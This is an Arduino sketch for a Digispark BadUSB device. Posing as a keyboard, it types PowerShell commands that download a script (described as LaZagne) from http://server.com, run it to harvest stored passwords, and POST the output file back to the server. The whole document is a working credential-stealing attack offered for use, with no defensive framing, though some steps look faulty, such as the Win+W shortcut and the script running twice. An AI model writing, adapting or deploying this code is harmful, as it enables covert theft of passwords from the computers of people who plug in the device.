#include <DigiUSB.h>
#include <DigiKeyboard.h>


//This script download the LaZagne software, executes it and upload the output file back to your web server


void setup() {
  DigiUSB.begin();
  DigiKeyboard.sendKeyStroke(0); // ensure keyboard is ready
}

void loop() {
  // Download file from server
  DigiKeyboard.sendKeyStroke(KEY_W, MOD_GUI_LEFT);
  DigiKeyboard.print("powershell Invoke-WebRequest -Uri http://server.com/file.py -OutFile file.py");
  DigiKeyboard.sendKeyStroke(KEY_RETURN);
  
  // Run file with python
  DigiKeyboard.sendKeyStroke(KEY_W, MOD_GUI_LEFT);
  DigiKeyboard.print("python file.py");
  DigiKeyboard.sendKeyStroke(KEY_RETURN);
  
  // Save output to file
  DigiKeyboard.sendKeyStroke(KEY_W, MOD_GUI_LEFT);
  DigiKeyboard.print("python file.py > output.txt");
  DigiKeyboard.sendKeyStroke(KEY_RETURN);
  
  // Send output file back to server
  DigiKeyboard.sendKeyStroke(KEY_W, MOD_GUI_LEFT);
  DigiKeyboard.print("powershell Invoke-WebRequest -Uri http://server.com/upload -Method POST -InFile output.txt");
  DigiKeyboard.sendKeyStroke(KEY_RETURN);

  // end the script
  DigiUSB.end();
}
